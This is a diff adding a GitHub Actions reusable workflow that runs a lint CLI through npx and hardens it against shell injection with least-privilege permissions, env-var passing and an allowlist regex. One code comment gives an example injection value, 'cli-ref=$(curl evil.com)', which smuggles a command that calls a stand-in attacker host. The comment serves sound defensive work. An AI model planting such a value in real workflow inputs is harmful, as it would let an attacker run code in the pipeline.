@@ -1,0 +1,83 @@
+# harness-checks.yml — reusable workflow per CS12.
+#
+# Consumers invoke this with ~10 lines:
+#   jobs:
+#     harness:
+#       uses: henrik-me/agent-harness/.github/workflows/harness-checks.yml@v0.1.0
+#       with:
+#         cli-ref: v0.1.0  # optional; defaults to harness.config.json version
+#
+# Runs `harness lint --quiet` against the caller repo using the harness CLI
+# pinned to the supplied (or auto-derived) ref.
+
+name: harness-checks
+
+# CS12 R1 (PR #48 review): explicit least-privilege permissions. The reusable
+# workflow only needs to checkout caller content + invoke the CLI; it must NOT
+# inherit broader caller-side write permissions.
+permissions:
+  contents: read
+
+on:
+  workflow_call:
+    inputs:
+      cli-ref:
+        description: |
+          Harness CLI ref (semver tag, branch name, or full 40-char SHA) to
+          install via `npx -y github:henrik-me/agent-harness#<ref>`. If
+          omitted, derived from the caller repo's harness.config.json version
+          field. The ref is validated against a strict allowlist regex
+          (^[a-zA-Z0-9._/-]+$) BEFORE being passed to npx; any ref containing
+          shell metacharacters ($, `, ", ', ;, &, |, <, >, whitespace, etc.)
+          is rejected to prevent shell-command injection.
+        required: false
+        type: string
+        default: ''
+
+jobs:
+  harness-lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5  # v4
+      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020  # v4
+        with:
+          node-version: '20'
+      - id: derive-ref
+        name: Derive + validate effective harness CLI ref
+        # CS12 R1 (PR #48 review): pass the GitHub expression through env: AND
+        # validate against an allowlist regex before exporting as step output.
+        # Direct interpolation of `${{ inputs.cli-ref }}` into a `run:` shell
+        # script would allow shell-injection (e.g. cli-ref=$(curl evil.com)).
+        env:
+          INPUT_CLI_REF: ${{ inputs.cli-ref }}
+        run: |
+          if [ -n "$INPUT_CLI_REF" ]; then
+            ref="$INPUT_CLI_REF"
+            source="input"
+          elif [ -f harness.config.json ]; then
+            ref=$(node -e "console.log(JSON.parse(require('fs').readFileSync('harness.config.json','utf8')).version || '')")
+            source="harness.config.json"
+          else
+            echo "ERROR: no cli-ref input AND no harness.config.json found" >&2
+            exit 2
+          fi
+          if [ -z "$ref" ]; then
+            echo "ERROR: derived ref is empty (source=$source)" >&2
+            exit 2
+          fi
+          # Allowlist: alphanumeric, dot, underscore, slash, hyphen.
+          # Covers semver tags (v0.1.0), branch names (main, feature/x),
+          # and 40-char SHAs. Rejects anything with shell metacharacters.
+          if ! printf '%s' "$ref" | grep -Eq '^[a-zA-Z0-9._/-]+$'; then
+            echo "ERROR: ref \"$ref\" (source=$source) contains characters outside the allowlist [a-zA-Z0-9._/-]." >&2
+            echo "ERROR: Refusing to interpolate into shell — see CS12 R1 PR review for shell-injection rationale." >&2
+            exit 2
+          fi
+          echo "Effective harness CLI ref: $ref (source=$source)"
+          echo "ref=$ref" >> "$GITHUB_OUTPUT"
+      - name: Run harness lint
+        # Pass the validated ref through env: as well; never interpolate the
+        # GitHub expression directly into the run script body.
+        env:
+          CLI_REF: ${{ steps.derive-ref.outputs.ref }}
+        run: 'npx -y "github:henrik-me/agent-harness#${CLI_REF}" lint --quiet'
